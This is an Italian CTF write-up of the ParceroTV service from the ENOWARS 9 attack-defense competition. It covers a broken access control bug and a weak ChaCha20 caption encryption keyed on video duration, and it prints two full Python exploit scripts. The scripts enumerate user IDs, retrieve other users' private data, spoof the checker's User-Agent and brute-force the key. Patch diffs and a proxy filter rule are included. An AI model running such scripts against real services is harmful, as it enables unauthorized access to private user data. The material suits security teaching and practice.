---
title: "ENOWARS 9"
date: 2025-07-29T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["attack-defense", "ctf", "crypto", "web", "enowars"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Alcune writeups della nona edizione delle ENOWARS."
canonicalURL: "https://albovo.github.io/it/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "ENOWARS 9" # alt text
    caption: "Alcune writeups della nona edizione delle ENOWARS." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/it"
    Text: "Suggerisci modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
---
# ENOWARS 9 🚩
![enowars logo](/images/enowars.png)

## ParceroTV 🌐

### Panoramica

**ParceroTV** era un’applicazione web di condivisione video, simile a una versione in piccolo di YouTube, sviluppata con un backend in **Rust** usando il framework **Actix-web** e un database **SQLite**. Il servizio permetteva agli utenti di registrarsi, effettuare il login e caricare video e “shorts”. I video potevano essere contrassegnati come pubblici o privati, e gli utenti potevano creare playlist, commentare i video e visualizzare i profili di altri utenti. L’applicazione includeva anche una funzionalità “shorts” con didascalie auto-generate in spagnolo.

### Analisi e vulnerabilità

Il servizio conteneva due vulnerabilità critiche: un problema di Broken Access Control che consentiva l’accesso ai video privati di altri utenti, e un’implementazione di crittografia insicura nel sistema di didascalie degli shorts.

#### Vulnerabilità 1: Broken Access Control nell’API dei video privati

La vulnerabilità principale si trovava nell’endpoint API responsabile del recupero dei video privati di un utente: `/get_private_videos/{user_id}`. L’handler per questa rotta prendeva l’ID utente direttamente dal percorso URL e lo usava per interrogare il database alla ricerca di tutti i video privati associati.

Il difetto critico era il **totale assenza di controlli di autorizzazione**. Il codice non verificava se il `user_id` fornito nell’URL corrispondesse al `user_id` dell’utente autenticato memorizzato nella sessione. Questo significava che qualsiasi utente loggato poteva enumerare e accedere ai metadati dei video privati di un altro utente semplicemente indovinando o recuperando il suo ID utente.

È stato reso trivialmente semplice grazie a un altro endpoint, `/get_user_info_with_name/{name}`, che restituiva le informazioni di un utente, incluso il suo ID, basandosi sul suo nome utente.

Il percorso d’exploit era il seguente:

1. Un attaccante registra un nuovo account sulla piattaforma.
2. L’attaccante usa l’endpoint `/get_user_info_with_name/{victim_username}` per ottenere l’unico `user_id` della vittima.
3. L’attaccante invia una richiesta a `/get_private_videos/{victim_user_id}`.
4. L’API autorizza in modo improprio la richiesta e restituisce un oggetto JSON contenente i metadati di tutti i video privati della vittima, uno dei quali conteneva il flag nascosto nel campo di descrizione, codificato in Brainfuck.

#### Vulnerabilità 2: Crittografia insicura nelle didascalie degli shorts

La seconda vulnerabilità riguardava la funzionalità “shorts”. Quando un utente caricava uno short con didascalie, il backend le “traduceva” in spagnolo e le salvava come file `.vtt`. Questo processo prevedeva uno schema di crittografia personalizzato.

L’analisi dello script di exploit `NPI_hecker404_parceroTV_shorts.py` e del codice sorgente del backend (`shorts_lib.rs`) ha rivelato che la crittografia era gravemente difettosa:

1. **Generazione di chiave prevedibile**: la chiave di crittografia ChaCha20 a 256 bit era derivata direttamente dalla durata dello short in secondi (un valore `float`). Questo valore veniva convertito in millisecondi e utilizzato come seed. Così si creava uno spazio di chiavi estremamente piccolo e prevedibile, rendendo banale un attacco brute-force con valori di durata comuni.
2. **Codifica personalizzata**: prima della crittografia, il testo in chiaro veniva codificato in una serie di parole spagnole usando un dizionario fisso di 4096 parole (`spanish_words.txt`). Ogni parola rappresentava un blocco di 12 bit dei dati originali.

Il percorso d’exploit era:

1. L’attaccante individua uno short con didascalie tramite l’endpoint `/get_shorts`.
2. Scarica il file di didascalie cifrate `.vtt`.
3. Esegue il reverse della codifica in parole spagnole per ottenere il ciphertext grezzo.
4. Esegue un brute-force della durata del video (lo script di exploit ha usato con successo valori come `4.6` e `2.5` secondi) per generare la chiave ChaCha20 corretta.
5. Con la chiave corretta, decritta il ciphertext per rivelare il payload Brainfuck contenente il flag.

### Exploit

Qui puoi leggere gli script di exploit che ho scritto con NPI.

```python
#!/bin/env python3

from pwn import *
import requests
import sys
import json
import string
import random

service_name = 'parceroTV'
ip = sys.argv[1]

alph = string.ascii_uppercase + string.digits

if service_name:
    attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json()
    getid = attacksjson['services'][service_name][ip]


def add_metadata(input_path: str,
                 output_path: str,
                 title: str = None,
                 artist: str = None,
                 genre: str = None) -> None:
    cmd = ["ffmpeg", "-i", input_path]

    if title:
        cmd += ["-metadata", f"title={title}"]
    if artist:
        cmd += ["-metadata", f"artist={artist}"]
    if genre:
        cmd += ["-metadata", f"genre={genre}"]

    cmd += ["-c", "copy", output_path]

    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def brainfuck(input):
    ...
    return output

def attack(fid=None):
    try:
        username_f = fid['0'][0]
        URL = f'http://{ip}:7777'
        assert username_f is not None, "User ID must be set"

        username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12))
        s = requests.Session()
        s.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'})
        s.get(URL)
        s.post(URL + '/newuser', data={'username': username, 'password': password})
        s.post(URL + '/checkcredentials', data={'username': username, 'password': password})

        userid = s.get(URL + f'/get_user_info_with_name/{username_f}').json()['id']

        video = s.get(URL + f'/get_private_videos/{userid}').json()[0]
        a = f'metadata_{video['name']}_{''.join(random.choices(string.digits, k=4))}.mp4'

        m = [
            video['name'],
            username_f,
            video['location']
        ]

        add_metadata('video.mp4', a, title=m[0], artist=m[1], genre=m[2])

        s.post(URL + '/app/create_video', data={
            'name': video['name'],
            'description': os.urandom(12).hex(),
            'is_private': 1,
            'location': video['location'],
            
        }, files={
            'file': open(a, 'rb'),
            'thumbnail': open('thumbnail.png', 'rb')
        })

        print(f'{a}', flush=True)
        path = '/get_video_info/' + s.get(URL + '/get_my_videos').json()[0]['path']
        print(brainfuck(s.get(URL + path).json()['description']), flush=True)
    except:
        pass

if getid:
    for round in getid:
        attack(getid[round])
else:
    attack()
```

E

```python
#!/usr/bin/env python3

import requests, re, sys, random, string
from pathlib import Path
from typing import List, Dict, Set
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend

PER_LETTER = 4096 // 26
alph = string.ascii_uppercase + string.digits


def brainfuck(input):
    ...
    return output

def build_spanish_words(path: str = "spanish_words.txt") -> List[bytes]:
    raw = Path(path).read_bytes()
    all_words = [w.strip() for w in raw.splitlines() if w.strip()]
    
    groups: Dict[bytes, List[bytes]] = {}
    for w in all_words:
        first = w[0:1].lower()
        if b'a' <= first <= b'z':
            groups.setdefault(first, []).append(w)
    
    used: Set[bytes] = set()
    result: List[bytes] = []
    
    for letter_ord in range(ord(b'a'), ord(b'z') + 1):
        letter = bytes([letter_ord])
        bucket = groups.get(letter, [])
        for w in bucket[:PER_LETTER]:
            if w not in used:
                used.add(w)
                result.append(w)
    
    for w in all_words:
        if len(result) >= 4096:
            break
        if w not in used:
            used.add(w)
            result.append(w)
    
    if len(result) != 4096:
        raise ValueError(f"Expected 4096 words, got {len(result)}")
    
    return result


def decrypt_spanish_stream(
    cipher_words: List[bytes],
    duration_secs: float,
    words_file: str = "spanish_words.txt"
) -> str:
    table = build_spanish_words(words_file)
    inv_table = {w: i for i, w in enumerate(table)}

    bit_buf = 0
    bit_count = 0
    cipher_bytes = bytearray()

    for w in cipher_words:
        try:
            idx = inv_table[w]
        except KeyError:
            # Questa situazione non dovrebbe verificarsi con la corretta gestione dei byte
            continue
        if idx >= 4096:
            raise ValueError(f"Word index out of range: {idx}")
        bit_buf = (bit_buf << 12) | idx
        bit_count += 12

        while bit_count >= 8:
            bit_count -= 8
            byte = (bit_buf >> bit_count) & 0xFF
            cipher_bytes.append(byte)


    ms = int(round(duration_secs * 1000.0))
    if ms == 0:
        ms = 1
    seed = ms.to_bytes(8, "little") + b"\x00" * 24

    key = seed
    nonce = b"\x00" * 16
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend()).encryptor()

    keystream = cipher.update(b"\x00" * len(cipher_bytes) * 8)

    plain_bytes = bytearray()
    for i, cb in enumerate(cipher_bytes):
        kb = keystream[i * 8]
        plain_bytes.append(cb ^ kb)
    
    return plain_bytes.decode("utf-8", errors="ignore")


session = requests.Session()
session.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'})

def extract_vtt_text(vtt_content: bytes) -> List[bytes]:
    lines = vtt_content.splitlines()
    text_lines = []
    for line in lines:
        if re.match(br'^\d+$', line):
            continue
        if re.match(br'^\d{2}:\d{2}:\d{2}\.\d{3} --> \d{2}:\d{2}:\d{2}\.\d{3}$', line):
            continue
        if line.strip() == b"":
            continue
        if line.startswith(b'WEBVTT'):
            continue
        text_lines.append(line.strip())
    
    # Unisce tutte le linee di testo e poi le suddivide in parole
    full_text = b' '.join(text_lines)
    return full_text.split()

assert len(sys.argv) == 2
TEAM_IP = sys.argv[1]
service_name = 'parceroTV'

attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json()['services'][service_name][TEAM_IP]
URL = f'http://{TEAM_IP}:7777'

for rnd in attacksjson.items():
    vtt_file = rnd[1]['1'][0]
    username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12))

    session.get(URL)
    session.post(URL + '/newuser', data={'username': username, 'password': password})
    session.post(URL + '/checkcredentials', data={'username': username, 'password': password})

    r = session.get(URL + '/get_shorts').json()
    c = None
    for i in r:
        if i['name'] == vtt_file:
            c = i['caption_path']
            break
    
    if c:
        vtt_raw = session.get(URL + c).content
        encrypted = extract_vtt_text(vtt_raw)

        durations = [4.6, 2.5]
        for d in durations:
            f = decrypt_spanish_stream(encrypted, d, words_file="spanish_words.txt")
            if f.startswith('@') and f.endswith('@'):
                print(brainfuck(f), flush=True)
```

### Patch

Le modifiche git in staging mostrano che la vulnerabilità di Broken Access Control è stata corretta in `backend/src/main.rs`.

1. **Correzione per l’accesso ai video privati**: la funzione `get_private_videos_by_userid` è stata modificata per includere un controllo di autorizzazione essenziale. Ora confronta il `user_id` della sessione con quello nell’URL. Se non corrispondono, la richiesta viene respinta.

   ```diff
   --- a/backend/src/main.rs
   +++ b/backend/src/main.rs
   @@ -654,8 +654,11 @@ async fn get_private_videos_by_userid(
        pool: web::Data<Pool>,
        user_id: web::Path<i32>,
    ) -> Result<impl Responder, Error> {
        if let Ok(Some(_user_id)) = session.get::<i32>("user_id") {
   -        let conn = get_db_conn(&pool).await?;
            let user_id = user_id.into_inner();
   +        if _user_id != user_id {
   +            return Ok(redirect!("/no_permission"));
   +        }
   +        let conn = get_db_conn(&pool).await?;
            let videoss = web::block(move || select_private_videos_by_userid(conn, user_id))
                .await?
                .map_err(error::ErrorInternalServerError)?;
   ```

2. **Defesa-in-depth per le informazioni video**: un controllo analogo è stato aggiunto all’endpoint `/get_video_info/{path:.*}`. Questa patch garantisce che solo il proprietario di un video possa ottenere i suoi metadati dettagliati, prevenendo ulteriori fughe di informazioni anche se un attaccante trovasse un’altra via per accedere al percorso del video.

   ```diff
   --- a/backend/src/main.rs
   +++ b/backend/src/main.rs
   @@ -738,6 +741,9 @@ async fn get_video_info(
            let video_info = web::block(move || select_video_by_path(conn, &path))
                .await?
                .map_err(error::ErrorInternalServerError)?;
   +            if video_info.userId != user_id {
   +                return Ok(redirect!("/no_permission"));
   +            }
            Ok(HttpResponse::Ok().json(video_info))
        }
    } else {
   ```

Non sono state trovate patch negli staged changes per la vulnerabilità di crittografia insicura nel sistema di didascalie degli shorts, il che suggerisce che potrebbe essere stata trascurata o prevista in un commit successivo.

### Difesa a livello di rete

Oltre alle patch a livello di codice, è stata implementata una difesa a livello di rete. Abbiamo configurato il reverse proxy per ispezionare le richieste HTTP in arrivo. Identificando il `User-Agent` e altri header specifici utilizzati dal checker del gioco, abbiamo creato una regola di filtraggio. Qualsiasi richiesta al servizio che non corrispondesse al profilo di header del checker veniva bloccata. Questo ha mitigato efficacemente attacchi semplici automatizzati, costringendo gli avversari a costruire exploit più sofisticati in grado di emulare correttamente il traffico del checker, come dimostrato dagli header `User-Agent` presenti negli script di exploit forniti.
